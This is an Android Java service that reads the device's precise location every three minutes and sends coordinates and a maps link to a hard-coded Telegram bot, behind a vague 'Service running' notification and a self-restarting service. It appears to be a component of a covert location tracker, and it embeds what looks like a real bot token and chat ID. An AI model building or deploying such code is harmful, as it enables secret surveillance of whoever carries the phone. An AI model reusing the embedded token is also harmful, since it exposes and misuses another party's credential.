package com.tracker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import okhttp3.*;

public class TrackerService extends Service {

    // ==== CONFIG — replace these ====
    private static final String BOT_TOKEN = "8889259468:AAGdw-d71273CVyp__gNKVkPrrC92NRIK8U";
    private static final String CHAT_ID   = "5346580671";
    private static final long   INTERVAL_MS = 3 * 60 * 1000L;
    // =================================

    private static final String CH = "tracker_channel";
    private FusedLocationProviderClient flpc;
    private LocationCallback callback;
    private final OkHttpClient http = new OkHttpClient();

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        Notification n = new NotificationCompat.Builder(this, CH)
                .setContentTitle("Service running")
                .setContentText("Location updates active")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(1, n);
        }

        flpc = LocationServices.getFusedLocationProviderClient(this);

        LocationRequest req = LocationRequest.create()
                .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
                .setInterval(INTERVAL_MS)
                .setFastestInterval(INTERVAL_MS)
                .setSmallestDisplacement(0);

        callback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null) sendToTelegram(loc);
            }
        };

        try {
            flpc.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (SecurityException ignored) {
            stopSelf();
        }
    }

    private void sendToTelegram(Location loc) {
        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
        String mapsLink = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        String text = "*Location Update*\n"
                + "Time: `" + time + "`\n"
                + "Lat: `" + loc.getLatitude() + "`\n"
                + "Lon: `" + loc.getLongitude() + "`\n"
                + "Accuracy: `" + loc.getAccuracy() + "m`\n"
                + "[Open in Maps](" + mapsLink + ")";

        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .add("parse_mode", "Markdown")
                .add("disable_web_page_preview", "false")
                .build();

        http.newCall(new Request.Builder().url(url).post(body).build())
                .enqueue(new Callback() {
                    @Override public void onFailure(Call call, IOException e) { }
                    @Override public void onResponse(Call call, Response response) { response.close(); }
                });
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CH, "Tracker",
                    NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (flpc != null && callback != null) flpc.removeLocationUpdates(callback);
        super.onDestroy();
    }

    @Nullable @Override public IBinder onBind(Intent i) { return null; }
}
